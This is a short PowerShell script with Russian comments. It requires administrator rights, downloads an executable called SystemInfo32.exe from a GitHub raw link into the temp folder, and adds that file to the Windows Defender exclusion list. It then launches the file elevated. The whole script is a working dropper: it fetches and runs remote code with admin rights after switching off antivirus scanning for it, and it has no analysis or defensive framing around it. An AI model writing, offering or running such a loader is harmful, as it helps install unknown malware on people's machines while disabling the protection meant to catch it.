# Для работы скрипта требуется права администратора. Проверяем и перезапускаем при необходимости.
#Requires -RunAsAdministrator

# --- Конфигурация ---
$Url = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/SystemInfo32.exe"
$DownloadPath = "$env:TEMP\SystemInfo32.exe"
$ExclusionPath = $DownloadPath # Исключаем конкретный файл. Можно изменить на папку: $env:TEMP
# --------------------

# Функция для добавления исключения в Защитник Windows
function Add-DefenderExclusion {
    param([string]$Path)
    try {
        # Проверяем, существует ли уже такое исключение, чтобы не дублировать
        $existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
        if ($existingExclusions -contains $Path) {
            Write-Host "Исключение для пути '$Path' уже существует." -ForegroundColor Yellow
        } else {
            Add-MpPreference -ExclusionPath $Path
            Write-Host "Путь '$Path' успешно добавлен в исключения Защитника Windows." -ForegroundColor Green
        }
    } catch {
        Write-Host "Ошибка при добавлении исключения: $_" -ForegroundColor Red
        exit 1
    }
}

# --- Основной блок выполнения ---

# 1. Скачивание файла
Write-Host "Скачивание файла из $Url ..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -ErrorAction Stop
    Write-Host "Файл успешно сохранен в: $DownloadPath" -ForegroundColor Green
} catch {
    Write-Host "Ошибка при скачивании файла: $_" -ForegroundColor Red
    exit 1
}

# 2. Проверка, что файл действительно скачался
if (-not (Test-Path $DownloadPath)) {
    Write-Host "Файл не найден после скачивания. Операция прервана." -ForegroundColor Red
    exit 1
}

# 3. Добавление в исключения Защитника Windows
Write-Host "`nДобавление файла в исключения Защитника Windows..." -ForegroundColor Cyan
Add-DefenderExclusion -Path $ExclusionPath

# 4. Запуск файла от имени администратора
Write-Host "`nЗапуск файла от имени администратора..." -ForegroundColor Cyan
try {
    # Start-Process с -Verb RunAs уже запускает процесс от имени администратора.
    # Так как сам скрипт уже запущен с правами администратора, дочерний процесс также их унаследует,
    # но для надежности укажем явно.
    Start-Process -FilePath $DownloadPath -Verb RunAs -Wait
    Write-Host "Файл выполнен." -ForegroundColor Green
} catch {
    Write-Host "Ошибка при запуске файла: $_" -ForegroundColor Red
    exit 1
}

Write-Host "`nСкрипт завершил работу." -ForegroundColor Cyan
